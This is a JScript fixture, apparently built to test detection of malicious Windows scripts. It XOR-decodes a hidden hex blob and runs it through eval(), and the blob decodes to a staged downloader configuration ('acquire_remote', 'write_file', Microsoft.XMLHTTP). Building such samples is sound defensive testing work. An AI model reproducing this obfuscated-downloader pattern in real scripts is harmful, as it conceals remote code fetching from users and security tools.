// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_c7821ef3 = function(item1) {
  var item2 = [];
  var previous = 79;
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ previous); previous = item1[i]; }
  return item2;
};
var recover_8d378f11 = function() {
  // configuration reconstruction
  var packedText = "34:16:65:11:74:04:77:55:6f:34:16:77:14:65:10:79:0b:6e:31:43:26:4b:24:50:35:17:3b:19:6e:1c:75:01:64:3b:5d:34:58:3d:1f:42:6e:4c:2d:49:28:58:2c:49:3b:19:23:01:4c:25:46:34:5b:28:47:21:55:7b:23:6e:22:6a:3e:6a:3a:18:34:16:60:01:6d:18:7d:0e:2c:16:6d:4f:2c:4d:20:50:31:58:3f:51:0e:67:03:21:1b:39:5a:3b:56:26:47:2e:49:27:0a:39:5a:38:0f:6d:08:6a:0c:39:0f:2d:01:23:56:24:48:6a:50:72:1a:6e:1a:6a:19:23:0c:23:10:73:11:26:44:21:43:25:10:26:08:6d:15:74:19:69:05:60:4e:27:49:3f:5e:32:5b:3f:10:27:1f:7d:45:7d:18:2b:1c:32:56:37:43:61:4d:6f:1a:69:0c:7e:21:40:27:42:2c:58:7a:40:62:2a:5f:31:45:37:52:21:52:1e:7f:1d:32:01:62:00:37:55:30:52:34:01:37:15:39:1b:7d:14:78:1d:42:32:53:27:4f:6d:57:75:36:0c:50:0c:59:2a:4f:3d:4e:12:4e:1e:6b:09:65:0c:6f:33:6f:27:52:3c:48:3a:5f:2c:5f:13:72:10:4c:10:63:17:76:11:74:59:6a:09:6b:5c:3e:5b:39:5f:6a:5c:72:16:77:03:21:5c:70:52:21:55:34:53:36:75:1a:6f:01:75:57:6d:5f:22";
  var packedParts = packedText.split(":");
  var item1 = [];
  for (var hi = 0; hi < packedParts.length; hi++) { item1.push(parseInt(packedParts[hi], 16)); }
  var item6 = (2 > 1) ? "left" : "right";
  var item2 = [];
  try { item2 = decode_c7821ef3(item1); } catch (ignored) { item2 = []; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < item2.length; bi++) { textParts.push(String.fromCharCode(item2[bi])); }
  var item3 = textParts.join("");
  return item3;
  // end reconstruction
};
var inspect_705ab2c1 = function() {
  var item4 = eval("(" + recover_8d378f11() + ")");
  return { steps: item4.steps, adapter: item4.adapter, values: item4.values, stageCount: item4.stageCount };
};
